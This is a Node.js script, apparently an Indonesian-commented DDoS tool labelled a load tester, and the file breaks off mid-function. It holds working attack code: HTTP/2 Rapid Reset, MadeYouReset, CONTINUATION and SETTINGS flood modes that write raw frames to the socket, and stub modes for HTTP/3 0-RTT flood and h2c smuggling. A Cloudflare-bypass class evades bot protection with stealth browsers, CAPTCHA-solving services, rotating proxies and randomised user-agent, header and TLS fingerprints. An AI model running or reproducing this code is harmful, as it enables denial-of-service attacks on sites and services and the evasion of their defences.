#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const http = require('http');
const https = require('https');
const http2 = require('http2');
const tls = require('tls');
const { URL } = require('url');
const { performance } = require('perf_hooks');
const { EventEmitter } = require('events');

// Pustaka eksternal
const undici = require('undici');
const chalk = require('chalk');
const { program } = require('commander');
const { v4: uuidv4 } = require('uuid');
const puppeteer = require('puppeteer-extra');
const puppeteerStealth = require('puppeteer-extra-plugin-stealth');
const RecaptchaPlugin = require('puppeteer-extra-plugin-recaptcha');
const zenrows = require('zenrows');
const axios = require('axios');
const { ProxyAgent } = require('proxy-agent');

// Konfigurasi default
const DEFAULT_CONFIG = {
  duration: 60, // detik
  threads: 10,
  rate: 100, // permintaan per detik
  timeout: 30000, // ms - ditingkatkan untuk bypass
  userAgentRotation: true,
  adaptiveDelay: true,
  protocol: 'auto', // auto, http1, http2, http3
  attackMode: null, // null, rapid-reset, madeyoureset, continuation-flood, settings-flood, http3-0rtt-flood, h2c-smuggling
  bypassCloudflare: false,
  bypassMethod: 'auto', // auto, puppeteer, zenrows, proxy, hybrid
  proxyList: [], // List of proxies
  proxyRotation: true,
  zenrowsApiKey: '',
  zenrowsProxyCountry: '', // e.g., 'us', 'id', 'gb'
  zenrowsAntibot: false,
  zenrowsAntibotScore: '3', // 1-5
  zenrowsWaitFor: '', // CSS selector to wait for
  zenrowsBlockResources: '', // e.g., 'image,font,media'
  zenrowsCustomHeaders: true,
  useCookies: true,
  cookieFile: './cookies.json',
  simulateHuman: true,
  outputFormat: 'cli', // cli, json
  logLevel: 'info' // debug, info, warn, error
};

// Database User-Agent terbaru
const USER_AGENTS = [
  // Chrome
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  
  // Firefox
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0',
  'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
  
  // Safari
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
  
  // Edge
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
  
  // Mobile
  'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
  
  // Bot-like (untuk testing)
  'curl/8.4.0',
  'Wget/1.21.4',
  'PostmanRuntime/7.34.0'
];

// Header browser yang umum
const BROWSER_HEADERS = [
  {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Cache-Control': 'max-age=0'
  },
  {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Cache-Control': 'max-age=0'
  },
  {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Cache-Control': 'max-age=0'
  }
];

// Profil TLS yang umum
const TLS_PROFILES = [
  {
    ciphers: tls.DEFAULT_CIPHERS,
    sigalgs: 'ECDSA+SHA256:RSA+SHA256:ECDSA+SHA384:RSA+SHA384',
    minVersion: 'TLSv1.2'
  },
  {
    ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256',
    sigalgs: 'ECDSA+SHA256:RSA+SHA256',
    minVersion: 'TLSv1.3'
  },
  {
    ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256',
    sigalgs: 'ECDSA+SHA256:RSA+SHA256',
    minVersion: 'TLSv1.2'
  },
  {
    ciphers: 'ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256',
    sigalgs: 'ECDSA+SHA256:RSA+SHA256:ECDSA+SHA384:RSA+SHA384',
    minVersion: 'TLSv1.2'
  }
];

// List referer yang umum
const REFERERS = [
  'https://www.google.com/',
  'https://www.google.com/search?q=test',
  'https://www.facebook.com/',
  'https://twitter.com/',
  'https://www.linkedin.com/',
  'https://www.reddit.com/',
  'https://www.youtube.com/',
  'https://www.instagram.com/',
  'https://www.bing.com/',
  'https://duckduckgo.com/'
];

class CloudflareBypass {
  constructor(config) {
    this.config = config;
    this.cookies = {};
    this.currentProxyIndex = 0;
    this.sessionCookies = new Map();
    
    // Load cookies from file if exists
    if (config.useCookies && fs.existsSync(config.cookieFile)) {
      try {
        const cookieData = JSON.parse(fs.readFileSync(config.cookieFile, 'utf8'));
        this.cookies = cookieData;
      } catch (err) {
        console.warn('Failed to load cookies:', err.message);
      }
    }
  }

  async saveCookies() {
    if (!this.config.useCookies) return;
    
    try {
      fs.writeFileSync(this.config.cookieFile, JSON.stringify(this.cookies, null, 2));
    } catch (err) {
      console.warn('Failed to save cookies:', err.message);
    }
  }

  getRandomUserAgent() {
    return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
  }

  getRandomHeaders() {
    if (!this.config.userAgentRotation) {
      return {
        'User-Agent': USER_AGENTS[0],
        ...BROWSER_HEADERS[0]
      };
    }
    
    const headers = {
      'User-Agent': this.getRandomUserAgent(),
      ...BROWSER_HEADERS[Math.floor(Math.random() * BROWSER_HEADERS.length)]
    };
    
    // Add random referer
    if (Math.random() > 0.3) {
      headers.Referer = REFERERS[Math.floor(Math.random() * REFERERS.length)];
    }
    
    // Add DNT header randomly
    if (Math.random() > 0.5) {
      headers['DNT'] = '1';
    }
    
    // Add Sec-CH-UA headers for modern browsers
    if (headers['User-Agent'].includes('Chrome')) {
      headers['Sec-CH-UA'] = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"';
      headers['Sec-CH-UA-Mobile'] = '?0';
      headers['Sec-CH-UA-Platform'] = '"Windows"';
    }
    
    return headers;
  }

  getRandomProxy() {
    if (!this.config.proxyList || this.config.proxyList.length === 0) {
      return null;
    }
    
    if (this.config.proxyRotation) {
      this.currentProxyIndex = (this.currentProxyIndex + 1) % this.config.proxyList.length;
    }
    
    return this.config.proxyList[this.currentProxyIndex];
  }

  async executeBypass(target) {
    const method = this.config.bypassMethod;
    
    if (method === 'auto') {
      // Try different methods in order
      try {
        if (this.config.zenrowsApiKey) {
          return await this.executeZenrowsRequest(target);
        }
        
        // Try proxy first if available
        if (this.config.proxyList && this.config.proxyList.length > 0) {
          try {
            return await this.executeProxyRequest(target);
          } catch (err) {
            console.log('Proxy method failed, trying Puppeteer...');
          }
        }
        
        // Fall back to Puppeteer
        return await this.executePuppeteerRequest(target);
      } catch (err) {
        console.log('All bypass methods failed');
        throw err;
      }
    } else if (method === 'puppeteer') {
      return await this.executePuppeteerRequest(target);
    } else if (method === 'zenrows') {
      return await this.executeZenrowsRequest(target);
    } else if (method === 'proxy') {
      return await this.executeProxyRequest(target);
    } else if (method === 'hybrid') {
      return await this.executeHybridRequest(target);
    } else {
      throw new Error(`Unknown bypass method: ${method}`);
    }
  }

  async executePuppeteerRequest(target) {
    // Use puppeteer-extra with stealth plugin
    puppeteer.use(puppeteerStealth());
    
    // Add recaptcha plugin if needed
    if (this.config.solveCaptcha) {
      puppeteer.use(
        RecaptchaPlugin({
          provider: {
            id: '2captcha',
            token: this.config.captchaApiKey
          },
          visualFeedback: true
        })
      );
    }
    
    let browser;
    
    try {
      const options = {
        headless: 'new',
        args: [
          '--no-sandbox',
          '--disable-setuid-sandbox',
          '--disable-dev-shm-usage',
          '--disable-accelerated-2d-canvas',
          '--no-first-run',
          '--no-zygote',
          '--disable-gpu',
          '--disable-features=VizDisplayCompositor',
          '--window-size=1920,1080'
        ]
      };
      
      // Add proxy if available
      const proxy = this.getRandomProxy();
      if (proxy) {
        options.args.push(`--proxy-server=${proxy}`);
      }
      
      browser = await puppeteer.launch(options);
      
      const page = await browser.newPage();
      
      // Set viewport
      await page.setViewport({
        width: 1920,
        height: 1080,
        deviceScaleFactor: 1,
        isMobile: false,
        hasTouch: false,
        isLandscape: true
      });
      
      // Set user agent
      await page.setUserAgent(this.getRandomUserAgent());
      
      // Set extra headers
      await page.setExtraHTTPHeaders(this.getRandomHeaders());
      
      // Set cookies if available
      const domain = new URL(target).hostname;
      if (this.cookies[domain]) {
        await page.setCookie(...this.cookies[domain]);
      }
      
      // Simulate human behavior
      if (this.config.simulateHuman) {
        await this.simulateHumanBehavior(page);
      }
      
      // Navigate to page
      const response = await page.goto(target, {
        waitUntil: 'networkidle2',
        timeout: this.config.timeout
      });
      
      // Check for Cloudflare challenge
      if (response.status() === 403 || response.status() === 503) {
        const html = await page.content();
        if (html.includes('cloudflare') || html.includes('captcha') || html.includes('challenge')) {
          // Try to solve challenge
          await this.solveCloudflareChallenge(page);
          
          // Navigate again after solving
          await page.goto(target, {
            waitUntil: 'networkidle2',
            timeout: this.config.timeout
          });
        }
      }
      
      // Get cookies for future use
      const cookies = await page.cookies();
      if (cookies.length > 0) {
        this.cookies[domain] = cookies;
        await this.saveCookies();
      }
      
      // Get page content
      const data = await page.content();
      
      await browser.close();
      
      return {
        statusCode: response.status(),
        headers: response.headers(),
        data
      };
    } catch (error) {
      if (browser) await browser.close();
      throw new Error(`Puppeteer error: ${error.message}`);
    }
  }

  async simulateHumanBehavior(page) {
    // Random mouse movements
    await page.mouse.move(
      Math.floor(Math.random() * 500) + 100,
      Math.floor(Math.random() * 500) + 100,
      { steps: 10 }
    );
    
    // Random scroll
    await page.evaluate(() => {
      window.scrollTo(0, Math.floor(Math.random() * 300));
    });
    
    // Small delay
    await page.waitForTimeout(Math.random() * 1000 + 500);
  }

  async solveCloudflareChallenge(page) {
    console.log('Solving Cloudflare challenge...');
    
    // Wait for challenge to load
    await page.waitForSelector('#cf-challenge-form, #challenge-form', { timeout: 10000 })
      .catch(() => console.log('Challenge form not found'));
    
    // Wait for a bit to simulate human solving time
    await page.waitForTimeout(Math.random() * 5000 + 3000);
    
    // Try to click verification if present
    try {
      await page.click('#cf-challenge-h1, #challenge-stage', { timeout: 5000 });
    } catch (e) {
      // Ignore if not found
    }
    
    // Wait for challenge to be solved
    await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 30000 })
      .catch(() => console.log('Navigation timeout after challenge'));
  }

  async executeZenrowsRequest(target) {
    if (!this.config.zenrowsApiKey) {
      throw new Error('ZenRows API key is required for ZenRows bypass method');
    }
    
    try {
      // Build parameters for ZenRows API
      const params = {
        'url': target,
        'apikey': this.config.zenrowsApiKey,
        'js_render': 'true',
        'custom_headers': 'true',
        'premium_proxy': 'true'
      };
      
      // Add optional parameters if configured
      if (this.config.zenrowsProxyCountry) {
        params['proxy_country'] = this.config.zenrowsProxyCountry;
      }
      
      if (this.config.zenrowsAntibot) {
        params['antibot'] = 'true';
        params['antibot_score'] = this.config.zenrowsAntibotScore || '3';
      }
      
      if (this.config.zenrowsWaitFor) {
        params['wait_for'] = this.config.zenrowsWaitFor;
      }
      
      if (this.config.zenrowsBlockResources) {
        params['block_resources'] = this.config.zenrowsBlockResources;
      }
      
      if (this.config.zenrowsCustomHeaders) {
        // Add custom headers
        const headers = this.getRandomHeaders();
        Object.keys(headers).forEach(key => {
          params[`custom_headers[${key}]`] = headers[key];
        });
      }
      
      // Add cookies if available
      const domain = new URL(target).hostname;
      if (this.cookies[domain]) {
        params['cookies'] = this.cookies[domain].map(c => `${c.name}=${c.value}`).join('; ');
      }
      
      // Make request to ZenRows API
      const response = await axios({
        url: 'https://api.zenrows.com/v1/',
        method: 'GET',
        params: params,
        timeout: this.config.timeout
      });
      
      // Save cookies if set
      const setCookieHeader = response.headers['set-cookie'];
      if (setCookieHeader) {
        const cookies = Array.isArray(setCookieHeader) 
          ? setCookieHeader 
          : [setCookieHeader];
        
        this.cookies[domain] = cookies.map(cookieStr => {
          const parts = cookieStr.split(';')[0].split('=');
          return {
            name: parts[0].trim(),
            value: parts[1] ? parts[1].trim() : '',
            domain: domain
          };
        });
        
        this.saveCookies();
      }
      
      return {
        statusCode: response.status,
        headers: response.headers,
        data: response.data
      };
    } catch (error) {
      if (error.response) {
        // The request was made and the server responded with a status code
        throw new Error(`ZenRows error: ${error.response.status} - ${error.response.data}`);
      } else if (error.request) {
        // The request was made but no response was received
        throw new Error(`ZenRows network error: ${error.message}`);
      } else {
        // Something happened in setting up the request
        throw new Error(`ZenRows error: ${error.message}`);
      }
    }
  }

  async executeProxyRequest(target) {
    const proxy = this.getRandomProxy();
    if (!proxy) {
      throw new Error('No proxy available for proxy bypass method');
    }
    
    const url = new URL(target);
    const options = {
      hostname: url.hostname,
      port: url.port || (url.protocol === 'https:' ? 443 : 80),
      path: url.pathname + url.search,
      method: 'GET',
      headers: this.getRandomHeaders(),
      timeout: this.config.timeout,
      agent: new ProxyAgent(proxy)
    };
    
    // Add cookies if available
    if (this.cookies[url.hostname]) {
      options.headers['Cookie'] = this.cookies[url.hostname]
        .map(c => `${c.name}=${c.value}`)
        .join('; ');
    }
    
    return new Promise((resolve, reject) => {
      const req = (url.protocol === 'https:' ? https : http).request(options, (res) => {
        let data = '';
        res.on('data', (chunk) => { data += chunk; });
        res.on('end', () => {
          // Save cookies if set
          const setCookieHeader = res.headers['set-cookie'];
          if (setCookieHeader) {
            const cookies = Array.isArray(setCookieHeader) 
              ? setCookieHeader 
              : [setCookieHeader];
            
            this.cookies[url.hostname] = cookies.map(cookieStr => {
              const parts = cookieStr.split(';')[0].split('=');
              return {
                name: parts[0].trim(),
                value: parts[1] ? parts[1].trim() : '',
                domain: url.hostname
              };
            });
            
            this.saveCookies();
          }
          
          resolve({
            statusCode: res.statusCode,
            headers: res.headers,
            data
          });
        });
      });
      
      req.on('error', reject);
      req.setTimeout(this.config.timeout, () => {
        req.destroy();
        reject(new Error('Request timeout'));
      });
      
      req.end();
    });
  }

  async executeHybridRequest(target) {
    // Try multiple methods in sequence
    const methods = [
      () => this.executeZenrowsRequest(target),
      () => this.executePuppeteerRequest(target),
      () => this.executeProxyRequest(target)
    ];
    
    for (const method of methods) {
      try {
        return await method();
      } catch (err) {
        console.log(`Method failed: ${err.message}`);
        // Continue to next method
      }
    }
    
    throw new Error('All hybrid bypass methods failed');
  }
}

class LoadTester extends EventEmitter {
  constructor(options) {
    super();
    this.config = { ...DEFAULT_CONFIG, ...options };
    this.cloudflareBypass = new CloudflareBypass(this.config);
    this.stats = {
      startTime: 0,
      endTime: 0,
      requests: {
        total: 0,
        success: 0,
        errors: 0,
        byProtocol: {
          http1: 0,
          http2: 0,
          http3: 0
        },
        byStatus: {}
      },
      latency: {
        min: Infinity,
        max: 0,
        sum: 0,
        count: 0
      },
      rps: 0,
      lastRpsUpdate: 0,
      lastRequestCount: 0
    };
    this.isRunning = false;
    this.workers = [];
    this.currentDelay = 0;
    this.blockedStatusCodes = [403, 429, 503];
    this.recentEvents = [];
    this.maxEvents = 20;
  }

  async start(target) {
    if (this.isRunning) {
      this.log('Test already running', 'warn');
      return;
    }

    this.isRunning = true;
    this.stats.startTime = Date.now();
    this.stats.lastRpsUpdate = Date.now();
    this.target = new URL(target);
    
    this.log(`Starting load test against ${this.target.origin}`, 'info');
    this.log(`Configuration: ${JSON.stringify(this.config, null, 2)}`, 'debug');

    // Setup monitoring
    this.setupMonitoring();

    // Start workers
    for (let i = 0; i < this.config.threads; i++) {
      const worker = this.createWorker(i);
      this.workers.push(worker);
      worker.start();
    }

    // Set timeout to stop the test
    setTimeout(() => {
      this.stop();
    }, this.config.duration * 1000);
  }

  stop() {
    if (!this.isRunning) {
      this.log('Test not running', 'warn');
      return;
    }

    this.isRunning = false;
    this.stats.endTime = Date.now();
    
    // Stop all workers
    this.workers.forEach(worker => worker.stop());
    
    this.log(`Load test completed in ${((this.stats.endTime - this.stats.startTime) / 1000).toFixed(2)} seconds`, 'info');
    this.log(`Total requests: ${this.stats.requests.total}`, 'info');
    this.log(`Successful requests: ${this.stats.requests.success}`, 'info');
    this.log(`Error requests: ${this.stats.requests.errors}`, 'info');
    this.log(`Average RPS: ${(this.stats.requests.total / ((this.stats.endTime - this.stats.startTime) / 1000)).toFixed(2)}`, 'info');
    this.log(`Average latency: ${(this.stats.latency.sum / this.stats.latency.count || 0).toFixed(2)} ms`, 'info');
    
    this.emit('complete', this.stats);
  }

  createWorker(id) {
    const worker = {
      id,
      isActive: false,
      interval: null,
      requests: 0,
      errors: 0,
      
      start: () => {
        worker.isActive = true;
        
        // Calculate delay based on rate
        const delay = Math.max(1, Math.floor(1000 / (this.config.rate / this.config.threads)));
        
        // Execute requests in a loop
        const executeRequest = async () => {
          if (!worker.isActive) return;
          
          try {
            await this.executeRequest();
            worker.requests++;
          } catch (error) {
            worker.errors++;
            this.log(`Worker ${id} error: ${error.message}`, 'error');
          }
          
          // Adaptive delay based on response status
          let nextDelay = delay + this.currentDelay;
          
          // Randomize delay to avoid robotic patterns
          nextDelay = nextDelay * (0.8 + Math.random() * 0.4);
          
          // Schedule next request
          worker.timeout = setTimeout(executeRequest, nextDelay);
        };
        
        executeRequest();
      },
      
      stop: () => {
        worker.isActive = false;
        if (worker.timeout) clearTimeout(worker.timeout);
      }
    };
    
    return worker;
  }

  async executeRequest() {
    const startTime = performance.now();
    let protocol = 'http1';
    let statusCode = 0;
    let error = null;
    
    try {
      // Determine protocol
      if (this.config.protocol === 'auto') {
        protocol = await this.detectProtocol();
      } else {
        protocol = this.config.protocol;
      }
      
      // Execute request based on protocol and attack mode
      let response;
      
      if (this.config.attackMode === 'rapid-reset') {
        response = await this.executeRapidResetAttack(protocol);
      } else if (this.config.attackMode === 'madeyoureset') {
        response = await this.executeMadeYouResetAttack(protocol);
      } else if (this.config.attackMode === 'continuation-flood') {
        response = await this.executeContinuationFloodAttack(protocol);
      } else if (this.config.attackMode === 'settings-flood') {
        response = await this.executeSettingsFloodAttack(protocol);
      } else if (this.config.attackMode === 'http3-0rtt-flood') {
        response = await this.executeHttp30RttFloodAttack(protocol);
      } else if (this.config.attackMode === 'h2c-smuggling') {
        response = await this.executeH2CSmugglingAttack(protocol);
      } else {
        // Normal request
        if (this.config.bypassCloudflare) {
          response = await this.cloudflareBypass.executeBypass(this.target.href);
        } else {
          const headers = this.cloudflareBypass.getRandomHeaders();
          response = await this.executeNormalRequest(protocol, headers);
        }
      }
      
      statusCode = response.statusCode;
      
      // Update stats
      this.updateStats(protocol, statusCode, startTime);
      
      // Adaptive delay based on status code
      if (this.config.adaptiveDelay && this.blockedStatusCodes.includes(statusCode)) {
        this.currentDelay = Math.min(5000, this.currentDelay + 100);
        this.log(`Adaptive delay increased to ${this.currentDelay}ms due to status ${statusCode}`, 'warn');
      } else if (this.currentDelay > 0) {
        this.currentDelay = Math.max(0, this.currentDelay - 10);
      }
      
    } catch (err) {
      error = err;
      this.updateStats(protocol, 0, startTime, err);
    }
    
    // Add to recent events
    this.addRecentEvent({
      timestamp: Date.now(),
      protocol,
      statusCode,
      error: error ? error.message : null,
      latency: Math.round(performance.now() - startTime)
    });
  }

  async detectProtocol() {
    try {
      // Try HTTP/2 first
      const client = http2.connect(this.target.origin, {
        timeout: this.config.timeout,
        ...this.getRandomTlsProfile()
      });
      
      await new Promise((resolve, reject) => {
        client.on('connect', resolve);
        client.on('error', reject);
        
        // Timeout if no response
        setTimeout(() => {
          client.destroy();
          reject(new Error('HTTP/2 connection timeout'));
        }, 2000);
      });
      
      client.destroy();
      return 'http2';
    } catch (err) {
      // Fall back to HTTP/1.1
      return 'http1';
    }
  }

  async executeNormalRequest(protocol, headers) {
    const options = {
      method: 'GET',
      headers,
      timeout: this.config.timeout,
      path: this.target.pathname + this.target.search
    };
    
    if (this.target.protocol === 'https:') {
      options.https = this.getRandomTlsProfile();
    }
    
    if (protocol === 'http2') {
      return this.executeHttp2Request(options);
    } else {
      return this.executeHttp1Request(options);
    }
  }

  async executeHttp1Request(options) {
    return new Promise((resolve, reject) => {
      const req = (this.target.protocol === 'https:' ? https : http).request(
        this.target.origin,
        options,
        (res) => {
          let data = '';
          res.on('data', (chunk) => { data += chunk; });
          res.on('end', () => {
            resolve({
              statusCode: res.statusCode,
              headers: res.headers,
              data
            });
          });
        }
      );
      
      req.on('error', reject);
      req.setTimeout(this.config.timeout, () => {
        req.destroy();
        reject(new Error('Request timeout'));
      });
      
      req.end();
    });
  }

  async executeHttp2Request(options) {
    return new Promise((resolve, reject) => {
      const client = http2.connect(this.target.origin, {
        timeout: this.config.timeout,
        ...this.getRandomTlsProfile()
      });
      
      client.on('error', reject);
      
      const req = client.request(options);
      
      req.setEncoding('utf8');
      
      let data = '';
      req.on('data', (chunk) => { data += chunk; });
      req.on('end', () => {
        client.destroy();
        resolve({
          statusCode: req.statusCode,
          headers: req.headers,
          data
        });
      });
      
      req.on('error', (err) => {
        client.destroy();
        reject(err);
      });
      
      req.setTimeout(this.config.timeout, () => {
        req.destroy();
        client.destroy();
        reject(new Error('Request timeout'));
      });
      
      req.end();
    });
  }

  async executeRapidResetAttack(protocol) {
    if (protocol !== 'http2') {
      throw new Error('Rapid Reset attack only works with HTTP/2');
    }
    
    return new Promise((resolve, reject) => {
      const client = http2.connect(this.target.origin, {
        timeout: this.config.timeout,
        ...this.getRandomTlsProfile()
      });
      
      client.on('error', reject);
      
      // Create multiple streams and immediately cancel them
      const streams = [];
      const streamCount = 10;
      
      for (let i = 0; i < streamCount; i++) {
        const req = client.request({
          ':path': this.target.pathname + this.target.search,
          ':method': 'GET',
          ...this.cloudflareBypass.getRandomHeaders()
        });
        
        streams.push(req);
        
        // Immediately cancel the stream
        setTimeout(() => {
          req.close(http2.constants.NGHTTP2_CANCEL);
        }, Math.random() * 10);
      }
      
      // Wait for all streams to be processed
      setTimeout(() => {
        client.destroy();
        resolve({
          statusCode: 200,
          headers: {},
          data: `Rapid Reset attack with ${streamCount} streams`
        });
      }, 100);
    });
  }

  async executeMadeYouResetAttack(protocol) {
    if (protocol !== 'http2') {
      throw new Error('MadeYouReset attack only works with HTTP/2');
    }
    
    return new Promise((resolve, reject) => {
      const client = http2.connect(this.target.origin, {
        timeout: this.config.timeout,
        ...this.getRandomTlsProfile()
      });
      
      client.on('error', reject);
      
      const req = client.request({
        ':path': this.target.pathname + this.target.search,
        ':method': 'POST',
        'content-length': '1' // Incorrect content length
      });
      
      // Send oversized data frame
      const oversizedData = 'A'.repeat(65536); // 64KB data
      
      req.write(oversizedData);
      req.end();
      
      req.on('response', (headers) => {
        client.destroy();
        resolve({
          statusCode: headers[':status'] || 0,
          headers,
          data: 'MadeYouReset attack'
        });
      });
      
      req.on('error', (err) => {
        client.destroy();
        resolve({
          statusCode: 0,
          headers: {},
          data: 'MadeYouReset attack triggered error',
          error: err.message
        });
      });
      
      req.setTimeout(this.config.timeout, () => {
        req.destroy();
        client.destroy();
        reject(new Error('Request timeout'));
      });
    });
  }

  async executeContinuationFloodAttack(protocol) {
    if (protocol !== 'http2') {
      throw new Error('CONTINUATION Flood attack only works with HTTP/2');
    }
    
    return new Promise((resolve, reject) => {
      const client = http2.connect(this.target.origin, {
        timeout: this.config.timeout,
        ...this.getRandomTlsProfile()
      });
      
      client.on('error', reject);
      
      // Create a stream with large headers that require CONTINUATION frames
      const req = client.request({
        ':path': this.target.pathname + this.target.search,
        ':method': 'GET',
        // Create many headers to force CONTINUATION frames
        'x-custom-header-1': 'A'.repeat(4096),
        'x-custom-header-2': 'B'.repeat(4096),
        'x-custom-header-3': 'C'.repeat(4096),
        'x-custom-header-4': 'D'.repeat(4096),
        'x-custom-header-5': 'E'.repeat(4096),
        ...this.cloudflareBypass.getRandomHeaders()
      });
      
      // Send multiple CONTINUATION frames without ending the header block
      const floodCount = 20;
      let sent = 0;
      
      const sendContinuation = () => {
        if (sent >= floodCount) {
          req.end();
          return;
        }
        
        // Manually create and send CONTINUATION frames
        // This is a simplified simulation as Node.js http2 doesn't expose direct frame control
        const frameData = Buffer.alloc(4096, 'F'); // Dummy data for frame
        
        try {
          req.session.socket.write(frameData);
          sent++;
          setTimeout(sendContinuation, 10); // Small delay between frames
        } catch (err) {
          // Ignore errors, just continue
          req.end();
        }
      };
      
      req.on('response', (headers) => {
        client.destroy();
        resolve({
          statusCode: headers[':status'] || 0,
          headers,
          data: `CONTINUATION Flood attack with ${floodCount} frames`
        });
      });
      
      req.on('error', (err) => {
        client.destroy();
        resolve({
          statusCode: 0,
          headers: {},
          data: 'CONTINUATION Flood attack triggered error',
          error: err.message
        });
      });
      
      req.setTimeout(this.config.timeout, () => {
        req.destroy();
        client.destroy();
        reject(new Error('Request timeout'));
      });
      
      // Start flooding
      sendContinuation();
    });
  }

  async executeSettingsFloodAttack(protocol) {
    if (protocol !== 'http2') {
      throw new Error('SETTINGS Flood attack only works with HTTP/2');
    }
    
    return new Promise((resolve, reject) => {
      const client = http2.connect(this.target.origin, {
        timeout: this.config.timeout,
        ...this.getRandomTlsProfile()
      });
      
      client.on('error', reject);
      
      // Send multiple SETTINGS frames
      const settingsCount = 50;
      let sent = 0;
      
      const sendSettings = () => {
        if (sent >= settingsCount) {
          // Create a normal request to complete the attack
          const req = client.request({
            ':path': this.target.pathname + this.target.search,
            ':method': 'GET',
            ...this.cloudflareBypass.getRandomHeaders()
          });
          
          req.on('response', (headers) => {
            client.destroy();
            resolve({
              statusCode: headers[':status'] || 0,
              headers,
              data: `SETTINGS Flood attack with ${settingsCount} frames`
            });
          });
          
          req.on('error', (err) => {
            client.destroy();
            resolve({
              statusCode: 0,
              headers: {},
              data: 'SETTINGS Flood attack triggered error',
              error: err.message
            });
          });
          
          req.end();
          return;
        }
        
        // Manually send SETTINGS frames
        try {
          // Create a SETTINGS frame (simplified)
          const settingsFrame = Buffer.from([
            0x00, 0x00, 0x06, // Length
            0x04,             // Type (SETTINGS)
            0x00,             // Flags
            0x00, 0x00, 0x00, 0x00, // Stream ID (0 for connection-wide)
            0x00, 0x04,       // Setting ID (HEADER_TABLE_SIZE)
            0x00, 0x00, 0x10, 0x00  // Value (4096)
          ]);
          
          client.session.socket.write(settingsFrame);
          sent++;
          setTimeout(sendSettings, 5); // Very small delay between frames
        } catch (err) {
          // Ignore errors, just continue
          sent++;
          setTimeout(sendSettings, 5);
        }
      };
      
      client.on('connect', () => {
        // Start flooding after connection is established
        sendSettings();
      });
      
      client.setTimeout(this.config.timeout, () => {
        client.destroy();
        reject(new Error('Connection timeout'));
      });
    });
  }

  async executeHttp30RttFloodAttack(protocol) {
    // Note: HTTP/3 support in Node.js is experimental and limited
    // This is a simplified simulation
    if (protocol !== 'http3') {
      throw new Error('HTTP/3 0-RTT Flood attack only works with HTTP/3');
    }
    
    return new Promise((resolve, reject) => {
      // Since Node.js doesn't have built-in HTTP/3 client, we'll simulate with HTTP/2
      // In a real implementation, you would use a library like `http3-client`
      
